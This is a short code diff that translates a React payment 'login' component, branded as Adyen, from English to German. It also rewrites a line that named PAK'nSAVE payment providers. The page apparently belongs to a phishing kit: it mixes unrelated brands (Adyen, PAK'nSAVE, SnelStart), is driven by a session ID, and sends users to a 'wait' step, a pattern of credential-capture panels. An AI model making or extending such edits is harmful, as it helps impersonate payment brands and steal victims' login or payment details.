@@ -36,7 +36,7 @@ export function AdyenLoginClient({ sessionId }: Props) {
 
     if (error) {
       setSaving(false);
-      alert("Something went wrong. Please try again.");
+      alert("Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.");
       return;
     }
     router.push(stepToPath("wait", sessionId));
@@ -53,15 +53,15 @@ export function AdyenLoginClient({ sessionId }: Props) {
 
         {/* Title & Description */}
         <div className="text-center mb-8">
-          <h1 className="text-xl font-semibold text-[#111111] mb-3">Complete your payment</h1>
+          <h1 className="text-xl font-semibold text-[#111111] mb-3">Schließen Sie Ihre Zahlung ab</h1>
           <p className="text-[#333333] text-sm leading-relaxed">
-            Adyen works with PAK'nSAVE payment providers to let you pay securely and quickly.
+            Adyen arbeitet mit sicheren Zahlungsanbietern zusammen, damit Sie schnell und sicher bezahlen können.
           </p>
         </div>
 
         {/* Provider Selection */}
         <div className="mb-4">
-          <h2 className="text-[15px] font-bold text-[#111111] mb-4">Choose how to pay:</h2>
+          <h2 className="text-[15px] font-bold text-[#111111] mb-4">Wählen Sie Ihre Zahlungsmethode:</h2>
           
           <div className="space-y-3">
             {/* SnelStart Button */}
